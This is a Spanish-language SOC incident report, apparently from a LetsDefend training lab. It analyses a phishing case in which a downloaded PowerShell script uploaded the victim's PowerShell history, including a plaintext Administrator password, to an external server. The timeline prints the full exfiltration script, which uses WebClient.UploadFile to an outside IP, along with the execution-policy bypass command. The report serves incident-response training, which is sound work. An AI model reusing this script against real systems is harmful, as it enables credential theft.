# Informe de Incidente - Attempt to Steal Credentials from the PowerShell History

## 1. Resumen Ejecutivo

Se investigó una alerta de seguridad relacionada con un intento de robo de credenciales desde el historial de PowerShell en el endpoint `Laureen`.

El usuario recibió un correo de phishing desde `support@andysalesproject.com`, hizo clic en el enlace, descargó `project_2024.zip` y ejecutó manualmente el script `project.ps1`. El script lee el historial de PowerShell del usuario (`ConsoleHost_history.txt`) y lo sube a un servidor externo (`200.183.149[.]135`). Ese historial contenía la contraseña de la cuenta local `Administrator`, introducida por el propio usuario minutos antes.

La investigación determinó que se trata de un Verdadero Positivo.

---

## 2. Detalles de la Alerta

| Campo | Valor |
|---|---|
| Plataforma | LetsDefend |
| ID del Caso | SOC267 |
| Tipo de Alerta | Phishing / C2 |
| Severidad | Alta |
| Estado | Escalado |
| Analista | Jorge Fernández Córcoles |
| Fecha | 10/09/2026 |

---

## 3. Información Inicial de la Alerta

| Campo | Valor |
|---|---|
| Nombre de la alerta | Attempt to Steal Credentials from the PowerShell History |
| IP origen | 200.183.149.135 |
| IP destino | 172.16.17.205 |
| Correo origen | support@andysalesproject.com |
| Correo destino | laureen@letsdefend.io |
| Hostname | Laureen |
| Usuario | LetsDefend |
| Hash del fichero | No disponible |
| URL / Dominio | https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip |
| Timestamp | 2024-03-18 05:27:34 |

---

## 4. Pasos de la Investigación

### 4.1 Revisión de la Alerta
La alerta mostraba un intento de robar credenciales desde el historial de PowerShell. La nota que deja el analista L1 concretó que el endpoint recibió un email desde `support@andysalesproject.com` minutos antes del incidente. Sin embargo, no pudo relacionar el incidente con el email recibido. Después de realizar un análisis completo, se puede determinar con exactitud que el email tiene relación directa con la alerta recibida.

### 4.2 Análisis de Logs
Los primeros logs muestran comandos ejecutados por el usuario `LetsDefend`, como por ejemplo `whoami` y `netstat`. Estos van seguidos de comandos de gestión de cuentas locales. Entre ellos está el cambio de contraseña del usuario `Administrator`, que la establece como `Letsdefend123`. 

Estos comandos quedan guardados en el fichero `ConsoleHost_History.txt` que termina siendo exfiltrado después de la descarga y posterior ejecución del script. No hay evidencias de acceso inicial al endpoint antes de ese momento. 

### 4.3 Análisis de IOCs
- `support@andysalesproject.com`, es la dirección remitente del correo phishing.  
- `https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip`, es el sitio web de descarga del fichero malicioso. Este bucket S3 de Amazon aparece como malicioso en VirusTotal: 7/92 proveedores de seguridad la marcan como maliciosa.
- `project.ps1`, es el script malicioso en sí.  
- `https://200.183.149[.]135/upload`, es el destino de la exfiltración.  
- `200.183.149[.]135`, es el servidor C2. Tanto en VirusTotal como en AbuseIPDB aparece con reputación limpia: 0/89 flags y 0% comprometida. 

### 4.4 Actividad del Usuario / Endpoint
El usuario abrió el enlace del correo en Chrome, descargó `project_2024.zip` y lo descomprimió. Después ejecutó `project.ps1`.
El script comprueba si existe el historial de PowerShell del usuario y, si no está vacío, lo sube por HTTPS a `https://200.183.149[.]135/upload`. No se observa acceso remoto del atacante ni actividad posterior en el endpoint. La exfiltración resultó exitosa.

### 4.5 Línea de Tiempo del Incidente

| Timestamp | Evento |
|---|---|
| 08:27:34 | Se recibe el correo phishing en el endpoint `Laureen` |
| 08:40:21 | Primeros comandos legítimos del usuario `LetsDefend` en el endpoint: `whoami`, `whoami /groups`, `ipconfig`, `netstat` |
| 08:44:18 | Comandos de creación de usuario, cambio de contraseñas en claro y consulta de grupos en el endpoint: `"New-LocalUser "Laureen" -Password $Password -FullName "Laureen Sophie" -Description "SOC Member"`, `$Password = Read-Host -AsSecureString`, `$newUser = "Laureen"`, `$groups = Get-LocalGroup -Member Laureen` y `net user Administrator Letsdefend123` |
| 08:51:45 | A esta hora el ususario clica el enlace y se realiza la descarga del zip desde el siguiente bucket S3 de amazon: `https://files-ld[.]s3[.]us-east-2[.]amazonaws[.]com/project_2024.zip` |
| 08:52:23 | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\project_2024\project.ps1'"`, que indica que el usuario clicó la opción de "**Ejecutar con PowerShell**" de Windows |
| 08:52:25 | `$newFilePath = "C:\Users\LetsDefend\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" if (Test-Path -Path $newFilePath -PathType Leaf) { $fileContent = Get-Content -Path $newFilePath -Raw if (![string]::IsNullOrWhiteSpace($fileContent)) { try { $webClient = New-Object System.Net.WebClient $webClient.UploadFile("https://200.183.149[.]135/upload", $newFilePath) Write-Host "File uploaded successfully." } catch { Write-Host "An error occurred while uploading the file: $_" } } else { Write-Host "The file is empty." } } else { Write-Host "File not found." }`. Tras la ejecución del archivo encontramos este comando con el cual el atacante busca exfiltrar un archivo llamado `ConsoleHost_History.txt`, si no está vacío, subiéndolo al sitio web: `https://200.183.149[.]135/upload`. |

---

## 5. Hallazgos

- El vector de entrada es un correo de phishing con enlace a un fichero comprimido alojado en Amazon S3.
- La ejecución la realiza el propio usuario; no hay explotación ni acceso remoto del atacante.
- El historial exfiltrado contenía la contraseña de la cuenta `Administrator` en texto plano. Esa credencial debe considerarse comprometida.
- El script envía el historial a `200.183.149[.]135`.

---

## 6. Mapeo MITRE ATT&CK

| Táctica | Técnica | Sub-técnica | Descripción |
|---|---|---|---|
| Acceso Inicial | T1566 | T1566.002 | El atacante consigue introducir el archivo en el endpoint a través de un link en un correo phishing |
| Ejecución | T1204 | T1204.002 | El usuario ejecuta `project.ps1` |
| Ejecución | T1059 | T1059.001 | El payload es un script de PowerShell |
| Acceso a credenciales | T1552 | T1552.003 | Lectura del historial de PowerShell con la contraseña de `Administrator` en claro |
| Recolección | T1005 | | Obtención de `ConsoleHost_history.txt` del disco local |
| Exfiltración | T1041 | | Subida a través de HTTPS a `200.183.149[.]135`, el canal C2 |

---

## 7. Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| VirusTotal | Para observar la reputación de IPs, sitios web y dominios maliciosos |
| AbuseIPDB | Misma función que VirusTotal |
| MITRE ATT&CK | Para el mapeo de TTPs |
| El propio endpoint `Laureen` | Para observar el contenido de `ConsoleHost_history.txt` |

---

## 8. Conclusión

| Campo | Valor |
|---|---|
| Clasificación | Verdadero Positivo |
| Impacto | Alto |

---

## 9. Acciones Recomendadas

- Aislar el equipo `Laureen` hasta completar la revisión.
- Cambiar de inmediato la contraseña de la cuenta local `Administrator`: `Letsdefend123`.
- Revisar los inicios de sesión de `Administrator` posteriores a la exfiltración.
- Eliminar `project_2024.zip` y `project.ps1` del equipo y limpiar el historial de PowerShell del usuario.
- Bloquear el dominio del remitente del correo (andysalesproject[.]com), la URL concreta del bucket S3 en el proxy y la IP `200.183.149[.]135` en el firewall.
- Formar al usuario para no caer en correos phishing y no pasar contraseñas en claro por línea de comandos, ya que quedan guardadas en el historial.

---
